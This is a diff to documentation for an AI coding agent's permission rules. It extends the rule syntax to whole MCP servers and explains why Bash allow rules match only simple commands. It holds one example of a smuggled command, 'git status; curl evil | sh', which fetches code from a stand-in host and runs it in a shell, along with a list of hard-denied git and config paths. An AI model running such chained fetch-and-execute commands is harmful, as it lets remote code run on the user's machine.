@@ -652,7 +652,7 @@ A hook `allow` skips the prompt but can't override `deny` rules or hard denials.
 
 ### Rule syntax
 
-Compatible with Claude Code's: `Tool`, `Tool(glob)`, `mcp__server__tool`. Examples: `Bash(git status*)`, `Edit(src/**)`, `Read(**/.env*)`.
+Compatible with Claude Code's: `Tool`, `Tool(glob)`, `mcp__server__tool`, and `mcp__server` for all of a server's tools. Examples: `Bash(git status*)`, `Edit(src/**)`, `Read(**/.env*)`.
 
 **`Bash` allow rules only match simple commands.** Anything containing `;`, `&`, `|`, `` ` ``, `$(`, `>`, `<`, a newline or `${` never matches an allow rule, and always asks. Otherwise `Bash(git *)` would permit `git status; curl evil | sh`. Deny rules match against the whole string and every simple segment. A command whose text mentions a hard-denied path (`.git/hooks`, `.git/config`, `git config`, `hooksPath`, `.harness`, `.mcp.json`, user config) never matches an allow rule either.
 
